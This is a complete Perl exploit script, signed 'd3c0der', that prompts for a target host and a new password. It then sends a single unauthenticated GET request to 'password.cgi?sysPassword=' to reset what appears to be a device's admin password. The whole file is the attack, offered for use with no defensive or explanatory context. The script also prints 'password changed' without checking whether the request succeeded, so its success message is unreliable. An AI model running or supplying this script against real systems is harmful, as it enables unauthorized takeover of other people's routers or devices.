#!/usr/bin/perl
#d3c0der


use HTTP::Request;
use LWP::UserAgent;

 

print "= Target : ";
$ip=<STDIN>;
chomp $ip;
print "= new password : ";
$npass=<STDIN>;
chomp $npass;

if ( $ip !~ /^http:/ ) {
$ip = 'http://' . $ip;
}
if ( $ip !~ /\/$/ ) {
$ip = $ip . '/';
}
print "\n";

print "->attacking , plz wait ! : $ip\n";
 

 

@path1=("password.cgi?sysPassword=$npass");

foreach $ways(@path1){

$final=$ip.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

 
}
 
print "[-] password changed to $npass \n";




 		 	   		  

